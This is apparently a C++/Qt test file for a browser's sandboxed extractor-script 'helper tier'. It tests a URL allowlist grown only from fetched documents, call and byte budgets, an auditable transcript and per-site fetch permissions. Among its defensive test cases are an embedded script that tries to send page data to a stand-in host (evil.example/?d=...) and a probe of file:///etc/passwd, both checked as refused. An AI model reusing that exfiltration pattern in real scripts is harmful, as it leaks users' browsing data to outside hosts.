// The helper tier (architecture doc §11.5.1): follow, not fabricate.
//
// No network here. The fetcher is injected, so the allowlist, the budgets and
// the transcript are all exercised against a scripted origin — which is also
// how the awkward cases (a refused address, a spent budget, a body that grows
// the allowlist) get tested at all, since a real server will not produce them
// on demand.
#include "extractor_helpers.h"
#include "site_extractor.h"
#include "policy_engine.h"
#include "policy.h"

#include <QCoreApplication>
#include <QDir>
#include <QFile>
#include <cstdio>

static int g_pass = 0, g_fail = 0;
static void check(bool ok, const QString &w) {
	if (ok) { ++g_pass; std::printf("  ok    %s\n", qPrintable(w)); }
	else    { ++g_fail; std::printf("  FAIL  %s\n", qPrintable(w)); }
}
static void section(const char *n) { std::printf("\n== %s ==\n", n); }

static QList<evidence_request> sample() {
	QList<evidence_request> ev;
	int n = 0;
	auto add = [&](const char *u, const char *k) {
		ev << evidence_request{ QUrl(QString::fromUtf8(u)), QString::fromUtf8(k), n++ };
	};
	add("https://site.example/watch/1", "other");
	add("https://cdn.example/v4/abc/cf-master.177.txt?k=UCp", "other");
	add("https://cdn.example/v4/abc/seg-00001.woff2?k=UCp", "other");
	return ev;
}

// A master playlist that refers to a variant nobody has requested yet — the
// case the tier exists for.
static const char *k_master =
  "#EXTM3U\n"
  "#EXT-X-STREAM-INF:BANDWIDTH=637387,RESOLUTION=406x720\n"
  "index-f1-v1-a1.txt?k=UCp\n";

int main(int argc, char **argv) {
	std::setvbuf(stdout, nullptr, _IONBF, 0);
	QCoreApplication app(argc, argv);

	const QUrl master("https://cdn.example/v4/abc/cf-master.177.txt?k=UCp");
	const QUrl variant("https://cdn.example/v4/abc/index-f1-v1-a1.txt?k=UCp");

	// A scripted origin, and a record of what it was asked for.
	QStringList asked;
	auto fake = [&asked](const QUrl &u, qint64 cap, int) -> fetch_result {
		asked << u.toString();
		fetch_result r;
		r.reached = true;
		r.status  = 200;
		if (u.toString().contains("cf-master")) {
			r.content_type = "application/vnd.apple.mpegurl";
			r.body = k_master;
		} else if (u.toString().contains("index-f1")) {
			r.content_type = "application/vnd.apple.mpegurl";
			r.body = "#EXTM3U\n#EXT-X-ENDLIST\n";
		} else if (u.toString().contains("denied")) {
			r.status = 403;
			r.content_type = "text/html";
			r.body = "no";
		} else {
			r.content_type = "video/mp4";
			r.body = QByteArray(4000, 'x');
		}
		if (cap >= 0 && r.body.size() > cap)
			r.body = r.body.left(int(cap));
		return r;
	};

	section("the allowlist starts as what the page requested");
	{
		helper_allowlist a;
		a.observe(sample());
		check(a.allows(master), "an observed address is allowed");
		check(!a.allows(variant),
		      "one that was never requested is not, however plausible");
		check(!a.allows(QUrl("https://evil.example/?d=x")),
		      "and an address the script would have to compose certainly is not");
		check(a.allows(QUrl(master.toString() + "#frag")),
		      "a fragment is not a different address");
		check(!a.allows(QUrl("file:///etc/passwd")),
		      "and only http(s) is followable at all");
	}

	section("it grows only from documents that were fetched");
	{
		helper_allowlist a;
		a.observe(sample());
		const int learned = a.learn_from(master, k_master);
		check(learned >= 1, QString("a playlist teaches its variants (%1)").arg(learned));
		check(a.allows(variant),
		      "so the variant it names may now be followed, relative and all");
		check(!a.allows(QUrl("https://evil.example/x.m3u8")),
		      "while nothing not in the document became reachable");

		// The mechanism is "what the document said", not "what the host is".
		helper_allowlist b;
		b.observe(sample());
		b.learn_from(master, "#EXTM3U\nhttps://other.example/v/x.m3u8\n");
		check(b.allows(QUrl("https://other.example/v/x.m3u8")),
		      "an absolute reference in a fetched body is followed across hosts");
		check(!b.allows(QUrl("https://other.example/v/y.m3u8")),
		      "but only the one it actually named");
	}

	section("a script can follow a manifest to its variant");
	{
		helper_allowlist a;
		a.observe(sample());
		helper_host h(&a, fake, helper_budget{});
		h.begin();
		asked.clear();

		const QVariantMap m = h.head(master.toString());
		check(m.value("kind").toString() == "hls",
		      "head says what the disguised .txt really is");

		const QString body = h.text(master.toString());
		check(body.contains("#EXTM3U"), "text returns the playlist");
		check(!h.text(variant.toString()).isEmpty(),
		      "and the variant it named is now reachable");
		check(asked.size() == 3, "three fetches, no more");
		check(!h.breached(), "nothing was breached");
	}

	section("what it refuses");
	{
		helper_allowlist a;
		a.observe(sample());
		helper_host h(&a, fake, helper_budget{});
		h.begin();

		check(h.text(variant.toString()).isEmpty(),
		      "the variant is refused before any document named it");
		check(h.breached(), "and that is a breach, not a quiet empty answer");
		check(h.breach().contains("never observed"),
		      QString("with a reason that says why (%1)").arg(h.breach()));
		check(h.transcript().size() == 1 && !h.transcript().first().allowed,
		      "the refusal is in the transcript rather than hidden");
	}

	section("budgets are enforced, not advisory");
	{
		helper_allowlist a;
		a.observe(sample());
		helper_budget tight;
		tight.max_calls = 3;
		helper_host h(&a, fake, tight);
		h.begin();
		for (int i = 0; i < 5; ++i)
			h.head(master.toString());
		check(h.calls_used() == 5, "every attempt is recorded");
		int allowed = 0;
		for (const helper_call &c : h.transcript()) if (c.allowed) ++allowed;
		check(allowed == 3, "but only three were permitted");
		check(h.breached() && h.breach().contains("3 helper calls"),
		      "and the breach names the budget");
	}
	{
		helper_allowlist a;
		a.observe(sample());
		helper_budget small;
		small.max_bytes = 1000;
		helper_host h(&a, fake, small);
		h.begin();
		h.text("https://cdn.example/v4/abc/seg-00001.woff2?k=UCp");  // 4000 bytes, capped
		check(h.bytes_used() <= 1000, "a body is capped at the byte budget");
		h.text(master.toString());
		check(h.breached() && h.breach().contains("bytes"),
		      "and the next call is refused once it is spent");
	}

	section("the transcript is the thing a person reviews");
	{
		helper_allowlist a;
		a.observe(sample());
		helper_host h(&a, fake, helper_budget{});
		h.begin();
		h.head(master.toString());
		h.text(master.toString());
		h.log("picked the 637 kbps variant");

		check(h.transcript().size() == 3, "every call is on it");
		check(h.transcript()[0].verb == "head" &&
		          h.transcript()[0].outcome.contains("mpegurl"),
		      "a head records what the server said");
		check(h.transcript()[1].outcome.contains("new addresses"),
		      "a body records that it widened what may be followed");
		check(h.transcript()[2].verb == "log" &&
		          h.transcript()[2].target.contains("637"),
		      "and a script's own note is kept beside them");
	}

	section("through the sandbox, as a script actually sees it");
	{
		// The case the tier exists for: the answer is the variant, which the page
		// never requested and which only the master playlist names.
		const QString src = R"JS(
			extract = function (page, requests) {
			  for (var i = 0; i < requests.length; i++) {
			    var u = requests[i].url;
			    if (hydra.head(u).kind !== 'hls') continue;
			    var body = hydra.text(u);
			    var m = body.match(/^[^#\r\n]+$/m);
			    if (!m) continue;
			    var variant = u.replace(/[^\/]*$/, '') + m[0].trim();
			    hydra.log('followed the master playlist to its variant');
			    return { url: variant, kind: 'hls', headers: { Referer: page.url } };
			  }
			  return null;
			};
		)JS";
		helper_allowlist a;
		a.observe(sample());
		helper_host h(&a, fake, helper_budget{});
		const extractor_verdict v =
		  site_extractor::check(src, QUrl("https://site.example/watch/1"),
		                         sample(), &h);
		check(v.usable, QString("it is accepted (%1)").arg(v.message));
		check(v.result.url.toString().contains("index-f1"),
		      "and the answer is the variant, which the page never requested");
		check(!v.invented,
		      "following a document that named it is not inventing it");
		check(h.transcript().size() >= 3, "with the whole walk on the transcript");
	}

	section("a script that reaches past what it was given");
	{
		const QString src =
		  "extract = function (page, requests) {"
		  "  var stolen = hydra.text('https://evil.example/?d=' + requests[0].url);"
		  "  return { url: requests[0].url, kind: 'direct' };"
		  "};";
		helper_allowlist a;
		a.observe(sample());
		helper_host h(&a, fake, helper_budget{});
		const extractor_verdict v =
		  site_extractor::check(src, QUrl("https://site.example/watch/1"),
		                         sample(), &h);
		check(!v.usable, "is refused");
		check(v.helper_breach,
		      "as a breach of the tier, not as a wrong answer");
		check(v.message.contains("never observed"),
		      QString("naming what it reached for (%1)").arg(v.message));
		check(asked.filter("evil.example").isEmpty(),
		      "and the address it made up was never actually fetched");
	}

	section("the pure tier cannot see the surface at all");
	{
		const QString src =
		  "extract = function (page, requests) {"
		  "  return { url: String(typeof hydra), kind: 'direct' };"
		  "};";
		const extraction r = site_extractor::run(
		  src, QUrl("https://site.example/watch/1"), sample());
		check(r.ok && r.url.toString() == "undefined",
		      "with no helpers supplied, `hydra` is not there to be found");
	}

	section("the tier is off until a site is trusted with it");
	{
		policy_engine pol;
		check(!pol.is_allowed(policy::feature::extractor_fetch, "site.example"),
		      "fetching is blocked by default");

		// **The two-powers checks that stood here are gone with the permission
		// they tested.** §11.5.1 splits the helper tier into fetching and
		// reading the page precisely so that granting the first cannot grant
		// the second, and this asserted it. The DOM half is designed and
		// unbuilt, so its permission is no longer offered -- a control read by
		// nothing, whose own description promised access to "whatever you are
		// logged in to".
		//
		// Testing that separation now would mean keeping the permission alive
		// to have something to assert about, which is the tail wagging the dog.
		// It comes back with the capability. What is still true is tested:
		// fetching is per-site, revocable, and does not leak.
		pol.set_setting("site.example", policy::feature::extractor_fetch,
		                 policy::setting::allow);
		check(pol.is_allowed(policy::feature::extractor_fetch, "site.example"),
		      "allowing fetch on one site allows it there");
		check(!pol.is_allowed(policy::feature::extractor_fetch, "other.example"),
		      "nor does it leak to another site");

		// Revocable, and the tri-state falls back to the global default rather
		// than to whatever was set before.
		pol.set_setting("site.example", policy::feature::extractor_fetch,
		                 policy::setting::unset);
		check(!pol.is_allowed(policy::feature::extractor_fetch, "site.example"),
		      "clearing the rule returns it to blocked");

		// It survives a round trip, or a permission granted once would quietly
		// become a permission granted forever with no record of it.
		const QString path = QDir::temp().filePath("hydra-policy-helpers.json");
		QFile::remove(path);
		pol.set_setting("site.example", policy::feature::extractor_fetch,
		                 policy::setting::allow);
		check(pol.save(path), "the rule saves");
		policy_engine reloaded;
		check(reloaded.load(path), "and loads");
		check(reloaded.is_allowed(policy::feature::extractor_fetch, "site.example"),
		      "with the grant intact");
		// An old policy file may still carry `extractorDom`. The loader must
		// ignore it rather than mistake it for something: `feature_from_name`
		// answers `count` and every caller skips that.
		check(policy::feature_from_name("extractorDom") == policy::feature::count,
		      "and a permission we no longer offer is ignored, not misread");
		QFile::remove(path);

		// The name is what a stored file and any future migration key on.
		check(QString(policy::feature_name(policy::feature::extractor_fetch))
		          == "extractorFetch",
		      "the machine name is stable");
		check(policy::feature_from_name("extractorFetch") ==
		          policy::feature::extractor_fetch,
		      "and parses back");
		// The DOM half of §11.5.1 is designed and unbuilt, so its permission is
		// not offered. An old policy file may still carry the key, and the
		// loader must ignore it rather than mistake it for something: every
		// caller of `feature_from_name` skips `feature::count`.
		check(policy::feature_from_name("extractorDom") == policy::feature::count,
		      "a permission for a capability that does not exist is not offered");
	}

	std::printf("\n%d passed, %d failed\n", g_pass, g_fail);
	return g_fail ? 1 : 0;
}
